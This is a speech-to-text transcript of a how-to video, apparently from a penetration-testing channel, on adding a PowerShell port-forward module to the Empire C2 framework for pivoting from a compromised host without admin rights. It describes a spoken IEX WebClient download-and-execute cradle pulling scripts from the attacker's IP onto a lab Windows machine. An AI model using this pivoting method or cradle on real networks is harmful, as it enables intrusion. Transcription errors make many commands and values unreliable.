 what's going on YouTube this is if site can be doing something a little bit different and just recording a how-to video I needed something short and sweet to upload to YouTube so I could test out a new microphone hopefully I sound much better anyways the module gonna add the Empire was created by decoder he just published it today and it was doing a port for it in PowerShell of course you can do this and Metasploit or kirb won't strike but without those two it's pretty hard to do a port for it without admin rights of course you have net SSH port proxy but well it requires admin so this module doesn't and the purpose of it is let's say we're the attack machine on the Left we get a foothold on patient zero and we can use patients here to execute code on a main controller in the server form on the right the domain controller may not be able to talk to the internet which means it can't talk to us so we create a reverse proxy on patient zero which means hey patient zero listen on port 9000 anything that comes in send it back to us so then the domain controller and that server firm is going to talk to patients here on port 9000 which is allowed and then patients here is going to afford that all the way to the internet and then to us so that is the purpose of the poi proxy with that being said let's just jump in before we begin actually writing an empire module adding a module to Empire we have to first download Empire and download what we want to add to it so I'm gonna go to github and Empire and then click on that first result and we'll do a git clone to start downloading this project I'm also going to go to twitter.com slash decoder underscore IT and this guy wrote the PowerShell script I want to add to Empire so if I click here we can download the PowerShell port for word script as well and let's just go into Empire start the install and then while it installs we'll explain exactly how to do these things or how it works it's really simple this video shouldn't go too long so that's going and we'll just look at the directory structure of empire we have data Lib plugins and setup well we know what setup is we just wanting them to install it there's plugins which you can create a plugin for Empire that's not like modules that you're taking about like Metasploit modules the modules itself you need two directories you need the data directory in the Lib directory ADA is where the powershell scripts go so if we go in data we can see like module source and then it's a listing of all the modules and Empire we're going to do a lateral movement one so we'll look at these and you can see just regular powershell scripts you could execute these natively if you wanted to there's nothing specific to Empire in these scripts so let's go back to the parent directory and look at Lib so the go in Lib we have common listeners modules as powershell in stages well we want to go into powershell because this is going to be where the actual scripts are if we do it LS nope we actually want to go into modules not PowerShell and then we have exfil X general PowerShell and Python so I'll show is where all the PowerShell modules are and there's also this handy-dandy PowerShell template PI I'm going to copy this into the how to add module the parent directory where we started because that's the template to create a Empire script so if we go into PowerShell we can see it's pretty much exactly the same thing they're all Python scripts and we'll go into the script once we start creating it but you can look at one like invoke PS exact dot pi and you can see this is just description stuff of how it runs different arguments you can add to it generator some snippets so it can do the invoke obfuscation but we got all we need out of that so let's just go back to how to add module and let's edit this PowerShell template so the beginning the name of this we're gonna be call this invoke port forward the author we're gonna put decoder underscore I T because he created this PowerShell module and now I'm gonna put myself as well the description let's just say this Ford's eight board I don't know what else to put so we'll just make it simple this for support the background we're gonna set this to true what this means is should Empire throw this into the background the script is not going to ever finish so we want to background it if it was like um power up or other things we'd sent back when to false because we just want to see the Stanton output we don't want that to go in the back we want to run and view the result for a port proxy we want to run and stay running forever so we're going to throw it in the background if you didn't set this to true then the agent would go stale students that runs because it would never check in because this program would never finish the output extension we don't have to do this because we're not saving a file does it need admin rights to run no this is one of the few ways to make a poor proxy work without admin rights OPSEC safe I'm think I'm gonna put false because I don't know how to kill this job once I started so I'm gonna put false there there may be a way in Empire to kill things that started in the background but I'm not sure so the only way I kill this is by killing the whole agent and before I do that I spawn a new agent and they're linked to any reference so here we can link the github page where we found this now we can go down the options so examples the agent is required and then everything else after this is not required so delete that command and we're going to add four more because if we look at dieter toe script it's going to take four arguments the local IP the local port the remote IP and the remote port so the description command to execute this will be the listener IP address required it's gonna be true the value nothing and let's see this is the variable argument so we'll call this listener IP the next one we're going to call listen to port and this will be the port to listen on the value still going to be blank next one is going to be the IP address - forward - and we can call this variable remote IP again there's no value and finally we need remote port and this will be v4 - forward - and after each one of these that needs to be a comma that looks good main menu this is generating so right here this module code is reading in the PowerShell script and we need to edit the path right here the data module source so if we open a new tab how to add module Empire to an empire we want to add it to let's say data module source lateral movement and we'll call it like port for ps1 so lateral movement port we'll call it invoke port FWD ps1 so we go into this directory everything is invokes so I'm gonna call it invoke just so it blends in okay we got that so it's gonna read that script and then we just want to do something with it the script end we didn't want to do in the data we could have left that script equals and then just drew it or command there and the script is going to end with invoke port forward - oh we don't do any options we just leave it like that because down here the next line is going to go through every single option and add - like listener IP space the listener IP remote IP etc so that's going to handle everything so this runs a module code which is just going to set up the function it's going to load so PowerShell knows what invoke port for it is and then script end is going to be the line that actually invokes what it just loaded and then everything after that gets added here as options and that should be good I'm just gonna go very top real quick give it a sanity check see if I have any issues it looks good agent listener I'm happy with that so we're gonna copy PowerShell template into Empire Lib modules PowerShell lateral movement and we'll call this port FWD PI if we look in that directory they don't follow the same naming convention as they do on data so if we just look at this we can see everything is similar we can actually move port forward to invoke underscore so it blends in it's always important to try to stay as close to the convention as possible and now we have to get decoder script which is port for ps1 we want to make this lately compatible with Empire see I still have that Twitter there we go good way wasn't there long it was a box like right up here I noticed so this is gonna be net code I'm gonna add the type and then call it like this so Empire is not going to like this because of how the arguments are so what we have to do is wrap this into a function so I'm going to call function invoke port forward what I call it before go back to to I just hit edit because I was finishing the install process them was it plugins lip nope not plugins Lib Lib modules PowerShell lateral movement invoke port forward what we call this port FWD for FWD now we gotta give the pram and then we gotta create the variable so it's gonna be a string and then listen IP then we do listen port then remote IP and remote port so that's how you set like named variables in PowerShell because it's going to be called with dashes so just below that we can indent this and start put forward we can remove all those and just use a variable so with an IP with some port remote IP and remote port and that bracket and then this gets called by like invoke port FWD with an IP IP listen for what and you get the deal it goes on from there so that is created we can move the PowerShell template put forward ps1 I mean so move this into Empire data module source PowerShell nope module source lateral movement invoke port FWD ps1 and I think that's what I had called it go back here invoke pour FWD PSone that looks correct so we should now be able to go into Empire execute Empire seems to have loaded everything there a search module we can search for a port FWD and now we have the module here so let's test this out so I'm gonna go listeners use listener HTTP then let's set the host to be HTTP 10 10 14 3 which is my IP we'll set it on port 8000 1 we also guys set the bind port to be 8000 1 now and we can execute this listener then we can do the command launcher PowerShell and copy this and then let's make the directory dub-dub-dub and put this code so this will be Empire dot ps1 will call this paste PowerShell I'm Python well there we go then I'm actually going to go over to tally it's just a Windows box I had ready to go so we'll try to load power shell is going relatively slow there we go ix new object net web client download string HTTP 10 10 14 3 Empire ps1 that should load Empire we go here we have the agent is now set to active so we can interact with it we go back agents interact you see and I'm gonna do a spawn as real quick or a spawn specify HCP so I have a background agent whenever I run a script that I think may just hang or kill my agent I always get two agents so I don't have to go and type that IEX command again so now we have to running we can interact with you see again we go to info we can use module what is it lateral movement port forward invoke port forward info and we can set the remote port to be 80 now we can set listener IP to be one 2700 one I know I'm making these a bit weird it's just how they got ordered on these options page I want this way to set index on options set listener port let's listen on 9001 because well we got to go above 9000 invalid option typo those are get you every time set the remote IP now to be me 10 10 14 3 right time 0 yep ok so now that is all setup if we do info again we see that we're going to listen on port listen on localhost one 2700 one on point 9001 and any connection that goes into that port we're going to 42 10 10 14 three on port 80 so if we execute modules our ops safe because again I said that I don't know how to kill it so we did that is there a jobs command or something I don't know we go back agents creds jobs task ID that doesn't seem to be it yeah I don't know how to kill the port for it once it starts but if we didn't make a mistake we should be listening on localhost 9000 1 was it 9001 let's see yep 9001 so let's see if i coded everything correct for the first time probably not things generally don't go that well for me localhost 9000 one problem loading page so we are not listening if we go back and then interact with the agent again maybe will give us an error message or maybe not so let us load PowerShell and run this manually because again none of the Empire things or the PowerShell scripts and Empire aren't empire specific so I can just go once this loads IEX new object matte web client dot download string 10 10 14 3 and we want to go what is it called copy this dub dub dub port FWD ps1 so it should be grabbing that script it got it okay so invoke and before we do this let's just test one 27001 just in case that's not set one 27001 the VM is going slow nope so we're going to invoke listen IP as one 27001 listen port 9000 to remote IP 10 10 14 3 remote port 80 looks like it's working 9000 dude that worked we see the script indeed does work so Empire air somewhere because 9001 is definitely not working so let's see use module info remote 80 10 10 14 3 9001 you can execute this again to see if it works we should all agents make sure it's not stale so 57 is last check end paper is checked in so that's definitely run by now and now it's not so let's take a look at what is going on so we go into the data module source lateral movement invoke port forward ps1 that looks good that's the same script we're running so let us go into the module so web modules PowerShell lateral movement invoke port forward so the name this stuff doesn't matter listen our IP listener port list do I've listen may have listened on my thing yeah I did listen so let's change that put those two go back to Empire go to main menu reload and then we want PowerShell lateral movement invoke port forward are you learning that module we can interact with their agent and we have to use module now and then erased all the options so I'm just going to control our and type II capital P to do recursive search my history for that command and type it for me so NPO Oh cuz list no is our so RP so we got to actually set this what's important three I guess I forget what I said it as set wissen IP to be one 27001 set mode IP 3 10 10 14 3 now we do info everything set we execute this and let's hope that on 9000 3 it is giving us our box there we go so that is all set up so now that box is forwarding a port without administrator rights so hope you guys enjoyed that little trick and hope my quota in the mic is good take care and I will see you later